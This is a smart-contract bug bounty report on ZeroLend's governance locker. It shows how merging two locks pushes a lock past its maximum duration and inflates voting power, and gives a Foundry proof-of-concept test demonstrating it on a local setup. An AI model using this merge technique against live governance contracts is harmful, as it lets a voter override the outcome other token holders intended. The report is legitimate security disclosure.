# 28892 - \[SC - Medium] ZeroLockermerge can make a voting lock last lon...

Submitted on Mar 1st 2024 at 01:23:04 UTC by @jovi for [Boost | ZeroLend](https://immunefi.com/bounty/zerolend-boost/)

Report ID: #28892

Report type: Smart Contract

Report severity: Medium

Target: <https://github.com/zerolend/governance>

Impacts:

* Manipulation of governance voting result deviating from voted outcome and resulting in a direct change from intended effect of original results

## Description

I have previously reported an issue called "ZeroLocker:merge can make a voting lock last longer than 4 years" as a primary medium-severity issue at Cantina's contest as there wasn't a voting power calculation function at that codebase. I am reporting it again as the impact at the codebase in Immunefi's scope is higher and presents a significance for the voting mechanics.

## Brief/Intro

The BaseLocker contract allows users to merge two different locks and end up with a lock that has a longer than MAXTIME difference between the end time and start time. This inflates the calculation of voting power for locks and give them an unfair advantage on governance.

## Vulnerability Details

The merge method enables a user to bypass the MAXTIME requirement by creating two different locks that last MAXTIME, one at Time0 and the second one some time later at Time1 then merging with the first lock as the merge target (or **to** argument) at the merge call:

```solidity
function merge(uint256 _from, uint256 _to) external override {
```

As the merge function at the BaseLocker contract does not check whether the end minus the locked0.start is not greater than MAXTIME, it enables arbitrary-sized lock durations:

```solidity
LockedBalance memory _locked0 = locked[_from];
        LockedBalance memory _locked1 = locked[_to];
        uint256 value0 = uint256(int256(_locked0.amount));
        uint256 end = _locked0.end >= _locked1.end
            ? _locked0.end
            : _locked1.end;

        locked[_from] = LockedBalance(0, 0, 0, 0);

        _burn(_from);
        _depositFor(_to, value0, end, _locked1, DepositType.MERGE_TYPE);
```

The depositFor internal method updates the lock, but it doesn't check the end timestamp and the start timestamp difference either, the only sanity check is in regards to unlockTime != 0:

```solidity
if (_unlockTime != 0) lock.end = _unlockTime;
```

This enables calculatePower to utilize a numerator bigger than MAXTIME, inflating locks amounts voting power:

```solidity
function _calculatePower(
        LockedBalance memory lock
    ) internal view returns (uint256) {
        return ((lock.end - lock.start) * lock.amount) / MAXTIME;
    }
```

## Impact Details

The whole voting mechanics is spoofed as merging allows users to have voting powers bigger than the maximum possible for the amounts deposited. This effectively makes governance a game of merging locks at the last possible moment before a voting start in order to have ever-increasing voting powers.

## References

Snippet in which merge doesn't check the total duration of the lock: <https://github.com/zerolend/governance/blob/main/contracts/locker/BaseLocker.sol#L180C8-L185C28> CalculatePower internal method: <https://github.com/zerolend/governance/blob/main/contracts/locker/BaseLocker.sol#L112C4-L117C1>

## Proof of concept

### PoC

Set up foundry on hardhat by placing

```solidity
import "@nomicfoundation/hardhat-foundry";
```

at the hardhat.config.ts file. Don't forget to install "@nomicfoundation/hardhat-foundry". Then install foundry at the contracts folder with the following command:

```solidity
forge init --force
```

Install openzeppelin contracts at foundry:

```solidity
forge install Openzeppelin/openzeppelin-contracts@v5.0.1 --no-commit
forge install OpenZeppelin/openzeppelin-contracts-upgradeable --no-commit
```

Place the following code-snippet at the Test.t.sol file inside the test folder:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {console} from "../../lib/forge-std/src/console.sol";
import {StdInvariant} from "../../lib/forge-std/src/StdInvariant.sol";
import {LockerLP} from "../../locker/LockerLP.sol";
import {Test} from "../../lib/forge-std/src/Test.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract MintableERC20 is ERC20 {
    address public owner;

    constructor(string memory name, string memory symbol) ERC20(name, symbol) {
        owner = msg.sender;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "MintableERC20: caller is not the owner");
        _;
    }

    function mint(address to, uint256 amount) public onlyOwner {
        _mint(to, amount);
    }
}

contract ZeroLendTest is StdInvariant, Test {

    LockerLP lockerLP;
    MintableERC20  arbitraryToken;
    address user = makeAddr("user");
    address public configurator = makeAddr("configurator");
    uint256 internal WEEK;
    uint256 internal MAXTIME;

    function setUp() public {
        vm.prank(configurator);
        arbitraryToken = new MintableERC20("Arbitrary Token", "ATKN");
        vm.prank(configurator);
        arbitraryToken.mint(user, 1 ether);


        vm.prank(configurator);
        lockerLP = new LockerLP();

        lockerLP.init(
            address(arbitraryToken),
            // staking address
            address(0x1000),
            // stakingBonus
            address(0x1001)
        );

        WEEK = 1 weeks;
        // MAXTIME is set to 1 year as it is the value set at the initialization of the LockerLP contract
        MAXTIME = 365 * 86400;

    }
 
    function test_poc() public {

        vm.prank(user);
        arbitraryToken.approve(address(lockerLP), 1 ether);

        uint256 unlockTime0 = ((block.timestamp + MAXTIME) / WEEK) * WEEK; // Locktime is rounded down to weeks
        vm.prank(user);
        lockerLP.createLock(0.5 ether, unlockTime0, false);

        // pass some time
        vm.warp(block.timestamp + WEEK);

        uint256 unlockTime1 = ((block.timestamp + MAXTIME) / WEEK) * WEEK - 100; // Locktime is rounded down to weeks
        vm.prank(user);
        lockerLP.createLock(0.5 ether, unlockTime1, false);

        vm.prank(user);
        lockerLP.merge(2, 1);

        (uint256 amountLocked, uint256 end, uint256 start,) = lockerLP.locked(1);
        // check if amount locked is 1 ether
        require(amountLocked == 1 ether, "wrong amount locked");

        // check the difference between the end and the start 
        require(end - start > MAXTIME, "lock duration is not over 1 year");
       
        // check if voting power is bigger than what should be possible
        uint256 maxVotingPower = MAXTIME * amountLocked / MAXTIME;
        uint256 currentVotingPower = (end - start) * amountLocked / MAXTIME;
        require(currentVotingPower > maxVotingPower, "current voting power is not bigger than maximum expected value");
    }

}
```
